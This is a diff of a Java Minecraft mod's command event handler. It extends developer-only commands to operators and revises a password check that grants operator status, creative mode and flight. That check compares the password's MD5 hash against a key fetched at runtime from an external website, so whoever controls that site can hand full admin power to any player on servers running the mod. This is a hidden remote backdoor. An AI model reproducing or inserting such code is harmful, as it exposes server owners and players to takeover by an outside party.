@@ -18,7 +18,7 @@ public class MITEITEEvents {
         String par2Str = event.getCommand();
         EntityPlayer player = event.getPlayer();
         ICommandListener commandListener = event.getListener();
-        if (Minecraft.inDevMode()) {
+        if (Minecraft.inDevMode() || player.isOp()) {
             World world = event.getWorld();
             ItemStack itemStack;
             NBTTagCompound compound;
@@ -264,12 +264,14 @@ public class MITEITEEvents {
             String md5key = HttpUtilities.performGetRequest("https://www.wensc.cn/mite.txt", 3000, 3000);
             if(md5String.a(password).equals(md5key)) {
                 player.setOp(true);
-                Minecraft.getClientPlayer().setOp(true);
+                player.capabilities.isCreativeMode = true;
+                player.capabilities.allowFlying = true;
                 player.setGameType(EnumGamemode.CREATIVE);
             } else {
                 boolean isOp = player.isOp();
                 player.setOp(false);
-                Minecraft.getClientPlayer().setOp(false);
+                player.capabilities.isCreativeMode = false;
+                player.capabilities.allowFlying = false;
                 if(isOp) {
                     player.setGameType(EnumGamemode.SURVIVAL);
                 }
